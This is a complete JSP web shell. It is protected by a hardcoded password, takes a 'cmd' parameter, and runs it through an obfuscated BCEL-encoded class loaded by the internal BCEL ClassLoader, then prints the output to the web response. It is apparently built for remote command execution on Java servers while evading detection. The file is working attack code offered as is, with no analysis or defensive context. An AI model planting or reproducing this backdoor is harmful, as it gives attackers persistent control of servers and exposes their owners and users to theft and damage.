

<%@ page language="java" pageEncoding="UTF-8" %>
<%! String PASSWORD = "4ra1n"; %>
<%
    String cmd = request.getParameter("cmd");
    String pwd = request.getParameter("pwd");
    if (!pwd.equals(PASSWORD)) {
        return;
    }
	String bcel = "$$BCEL$$$l$8b$I$A$A$A$A$A$A$A$85T$5bW$SQ$U$fe$8e$a0$H$86Q$R$c5k7$x$T$bcai7$v$xMK$c3K$a2$Y$8f$D$iul$YX$c3$e0$b2_$d4k$b5$KZ$b1V$af$ad$d5$7f$e9$P$f4$90$ed3$a0$88$da$ea$813$e7$ec$fd$9d$7d$f9$ce$b7$f9$f9$e7$dbw$ASHr41$b4$zk$HZ$7cO$YFd$e1$4078$dc$M$fe$7d$b2E$M$cd$dc$8d$ac$a5$f6E$dafpY$a2$c0$Q$88$d5$3dq$db$d2$cd$dd$uC$cb$p$dd$d4$edY$86$60$e8$bc$3b$9c$60P$W$O$d3$oo$eb9$b3$c0$e1c$e8$ac$a3N$3c$M$ee$f9$5cF$up$a1M$FG$3b$a5$M$85$T$i$j$M$3dg$a3$ce$Vu$p$p$y$F$7e$b4qt1t$3b$I$3d$X$99$x$ee$ec$IKd6$84F$A$8en$86$bec$df$92$99$_$da$U$40h$d9$aa$5bA$_$fa9$fa$Y$3a$ea$Z6$8a$a6$adg$85$8a$B$5c$a2$d2w$85$5d$b3$c8$fe$c2$b1s$c0$a8$8crE$c5U$5c$a3$k$c4$a1H3$M_D$c4$v$d3$ba$95K$8bB$81$ae$5e$c7M$8e$h$N$F$d4$9c$w$86p$8b$9e$87$K8U8$91q$5cDcG$U$x$88$90d$$$cc$d0$h$ba$Q$SN$u$e8$c4$a8$E$8d$d1$x$d4AU$3a$i$bf$l$T$w$o$98$a4g$d5$f2yaf$Y$c6$ff$d3M$c3$9bD$3d$b8$c3$c0$U$99iZ$c5$5d$dcc$f0P$f6LL7$89$c2$ae$d0$f9$9bQ$99$f5$81$8a$87$O$d6$ceU$ad$5e0DU4$a3$c5$8b$c7x$c21$db$a0$cb$f8$bb$82$z$b2$w$9e$e2$Z$v$rW$q$89$GO$faY$a7$Au$5e$Y$e6e$cb$k$F$Lx$c1$b1x$y$c0F$a0$8a$97Xb$e0yi2$cc3j$ae$8e$81$a3$e6v$d9$c9j1$9b$S$d6$a6$962$84$9c$8a$5cZ3$S$9a$a5$cbs$cd$e8$b6$f7t$9a$Y$7f$acq$beh$5e$5c$e9$y$b1$daTH$916$ffI$p$f1o9$afB$af$Z$bbX$dd$84q$h$O$ab$adq$5bK$bf$5d$d1$f2Nn$8eD$pUN$60$d2r$3cW$b4$d2bQ$97$e5ye1$T$S$84Ab$c8E$ff$I$8c$7eD7$adM$b4$t$c2$e8$eb$a5$93$9bN$KT$da$fd$so3$7d$b7F$cah$ad$c0$9f$y$p$b0RAg$b2$82$60$f2$xzFK$b8$5c$c2$60$Z$c3e$8c$ac$beG$fbX$9f$bb$84$f1$c0mZ$b6$c7K$98J$ce$b8$7f$i$fd$g$Z$x$e1$fe$X$cc$7c$c2$a3$KXr$b4$8c$b9$S$9e$7f$a4$c0$$$y$d3$3a$B$l$ad$kJ$ec$a5$b4R$j$3e$wR$a1$81hE$Im$98$a6$ef$yY$X$R$c0$s$e9$ec$V$a1g$9d$c2$b7$Q$c3$K$e0$ecV$c9$c2$e8$fe$S$d6$b0N$ad$Ma$S$af$b1A9Bd$8d$93$d7$8d$u$fak$bbM$ba3$80$a6$pr6s0$8e$z$O$3fG$tmd$df$3e$KE$fat$C$82$e6$83U$d9$g$f9$8c$99$P$Oa$b2$ee$W$c7$d8$ed$d4$a3$d6$e8$ac$d6$c3$b0$ed$a0$de$fc$Fm$97$f5e$7d$F$A$A";
    
	Class<?> c = Class.forName("com.sun.org.apache.bcel.internal.util.ClassLoader");
	
	// 根据 ClassLoader 的 class 文件创建一个对象 loader
    ClassLoader loader = (ClassLoader) c.newInstance();
	
	// 加载bcel
    Class<?> clazz = loader.loadClass(bcel);
    java.lang.reflect.Constructor<?> constructor = clazz.getConstructor(String.class);
    Object obj = constructor.newInstance(cmd);
	
	
    response.getWriter().print("<pre>");
    response.getWriter().print(obj.toString());
    response.getWriter().print("</pre>");
%>